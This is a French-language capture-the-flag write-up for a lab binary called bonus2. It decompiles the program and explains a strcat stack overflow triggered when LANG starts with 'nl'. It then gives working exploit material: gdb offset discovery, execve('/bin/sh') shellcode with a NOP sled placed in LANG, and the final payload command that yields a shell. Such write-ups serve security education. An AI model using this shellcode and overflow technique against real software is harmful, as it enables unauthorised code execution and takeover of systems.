# bonus2
    void greetuser(void)
    {
        char local_4c [4];
        undefined4 local_48;
        char local_44 [64];
        
        if (language == 1) {
            local_4c[0] = 'H';
            local_4c[1] = 'y';
            local_4c[2] = 'v';
            local_4c[3] = -0x3d;
            local_48._0_1_ = -0x5c;
            local_48._1_1_ = -0x3d;
            local_48._2_1_ = -0x5c;
            local_48._3_1_ = ' ';
            builtin_strncpy(local_44,"päivää ",0xb);
        }
        else if (language == 2) {
            builtin_strncpy(local_4c,"Goed",4);
            local_48._0_1_ = 'e';
            local_48._1_1_ = 'm';
            local_48._2_1_ = 'i';
            local_48._3_1_ = 'd';
            builtin_strncpy(local_44,"dag!",4);
            local_44[4] = ' ';
            local_44[5] = '\0';
        }
        else if (language == 0) {
            builtin_strncpy(local_4c,"Hell",4);
            local_48._0_1_ = 'o';
            local_48._1_1_ = ' ';
            local_48._2_1_ = '\0';
        }
        strcat(local_4c,&stack0x00000004);
        puts(local_4c);
        return;
    }

    undefined4 main(int param_1,int param_2)
    {
        undefined4 uVar1;
        int iVar2;
        char *pcVar3;
        undefined4 *puVar4;
        byte bVar5;
        char local_60 [40];
        char acStack_38 [36];
        char *local_14;
        
        bVar5 = 0;
        if (param_1 == 3) {
            pcVar3 = local_60;
            for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
            pcVar3[0] = '\0';
            pcVar3[1] = '\0';
            pcVar3[2] = '\0';
            pcVar3[3] = '\0';
            pcVar3 = pcVar3 + 4;
            }
            strncpy(local_60,*(char **)(param_2 + 4),0x28);
            strncpy(acStack_38,*(char **)(param_2 + 8),0x20);
            local_14 = getenv("LANG");
            if (local_14 != (char *)0x0) {
            iVar2 = memcmp(local_14,&DAT_0804873d,2);
            if (iVar2 == 0) {
                language = 1;
            }
            else {
                iVar2 = memcmp(local_14,&DAT_08048740,2);
                if (iVar2 == 0) {
                language = 2;
                }
            }
            }
            pcVar3 = local_60;
            puVar4 = (undefined4 *)&stack0xffffff50;
            for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
            *puVar4 = *(undefined4 *)pcVar3;
            pcVar3 = pcVar3 + ((uint)bVar5 * -2 + 1) * 4;
            puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
            }
            uVar1 = greetuser();
        }
        else {
            uVar1 = 1;
        }
        return uVar1;
    }

en clair: 

    int language = 0;

    void greetuser(char *src) {
        char dest[72]; // Espace alloué sur la stack pour le message d'accueil + src
        
        switch (language) {
            case 1: 
                strcpy(dest, "Hyv\xc3\xa4\xc3\xa4 päivää "); 
                break;
            case 2: 
                strcpy(dest, "Goedemiddag! "); 
                // ETAPE 1 : Le préfixe "Goedemiddag! " est copié au début du buffer dest.
                // Mémoire (13 octets) : [ G o e d e m i d d a g !   \0 ... ]
                break;
            default: 
                strcpy(dest, "Hello "); 
                break;
        }
        
        // src contient vos 72 octets contrôlés via argv[1] et argv[2]
        strcat(dest, src); 
        // ETAPE 2 : strcat prend src et le colle juste après le préfixe.
        // Mémoire : [ G o e d e m i d d a g !   |   A A A A A A A A ... (72 octets) ]
        // TOTAL : 13 octets (préfixe) + 72 octets (src) = 85 octets écrits.
        // Le buffer 'dest' ne faisant que 72 octets, l'écriture déborde de 13 octets.
        // Les 13 octets en trop écrasent le Saved EBP et surtout le Saved EIP (adresse de retour).

        puts(dest);
    }

    int main(int argc, char **argv) {
        char dest[76]; // 40 octets + 36 octets contigus
        
        if (argc != 3) {
            return 1;
        }
        
        // Initialisation du buffer à zéro
        memset(dest, 0, sizeof(dest));
        // ETAPE 1 : Le tableau dest[76] est entièrement mis à zéros (\0).
        // Mémoire : [ \0 \0 \0 ... (76 octets) ]
        
        // Copie contrôlée des arguments (40 octets + 32 octets = 72 octets max)
        strncpy(dest, argv[1], 40);       // 0x28
        // ETAPE 2 : Les 40 premiers octets d'argv[1] (ex: vos 100 'A' tronqués à 40) sont copiés.
        // Mémoire : [ A A A A A A A A ... (40 octets) | \0 \0 ... (36 octets restants) ]

        strncpy(dest + 40, argv[2], 32);  // 0x20
        // ETAPE 3 : Les 32 octets d'argv[2] (vos 'B' + l'adresse de retour) sont collés juste après.
        // Mémoire : [ 40 octets d'argv[1] | 32 octets d'argv[2] | 4 derniers octets inchangés (\0) ]
        // TOTAL : 72 octets écrits proprement dans dest[76]. Le buffer est plein, mais ne déborde PAS encore ici.
        
        // Vérification de la variable d'environnement LANG
        char *lang = getenv("LANG");
        if (lang != NULL) {
            if (memcmp(lang, "fi", 2) == 0) {
                language = 1;
            } else if (memcmp(lang, "nl", 2) == 0) {
                language = 2;
                // ETAPE 4 : LANG commence par "nl", donc language passe à 2. 
                // Cela forcera greetuser à utiliser le préfixe "Goedemiddag! ".
            }
        }
        
        greetuser(dest);
        // ETAPE 5 : On transmet notre variable 'dest' (76 octets préparés) à greetuser(). 
        // C'est là-bas que le strcat final va provoquer l'explosion de la pile.
        return 0;
    }


**setup la langue**

    export LANG=nl
    ./bonus2 1 1
    Goedemiddag! 1

**Trouver l'offset**

    (gdb) run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa
    Starting program: /home/user/bonus2/bonus2 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa
    Goedemiddag! aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaaaaabaaacaaadaaaeaaafaaagaaahaaa

    Program received signal SIGSEGV, Segmentation fault.
    0x61616761 in ?? ()


    61616761 = agaa = offset 23

**La technique : shellcode planqué dans `LANG` lui-même**

`LANG` est une variable d'environnement donc elle est sur la pile, à une adresse qu'on peut retrouver, et son contenu est entièrement sous contrôle (le programme ne vérifie que les 2 premiers caractères `"nl"`). On y planque un NOP sled + shellcode juste après :

    export LANG=$(printf 'nl'; printf '\x90%.0s' {1..100}; printf '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')

**Trouver l'adresse de `LANG`, en simple**

Plus besoin de gdb : `gcc` est dispo sur la machine, autant compiler un mini-programme qui appelle `getenv("LANG")` directement et lire l'adresse qu'il donne :

    echo 'int main(){printf("%p\n",getenv("LANG"));}' | gcc -xc -include stdio.h -include stdlib.h -o /tmp/addr -
    /tmp/addr

Le NOP sled donne de la marge (comme au bonus0), pas besoin que l'adresse soit exacte au byte près.

Repli si `gcc` n'est pas dispo : retrouver l'adresse dans `environ` via un breakpoint gdb juste après le `getenv` du programme lui-même :

    (gdb) b *main+125
    (gdb) run $(printf 'A%.0s' {1..100}) pop
    (gdb) x/20s *((char**)environ)
    0xbffffeb4: "LANG=nl\220\220\220...\220j\vX\231Rh//shh/bin\211\343\061\311\315\200"

**Construire le payload**

`argv[1]` = 100 octets de bourrage (rempli le message + le début du buffer). `argv[2]` = 23 octets de bourrage jusqu'à l'adresse de retour + l'adresse de `LANG` (little-endian) :

    ./bonus2 $(printf 'A%.0s' {1..100}) $(printf 'B%.0s' {1..23}; printf '\xe6\xfe\xff\xbf')

Donne un shell `bonus3`.
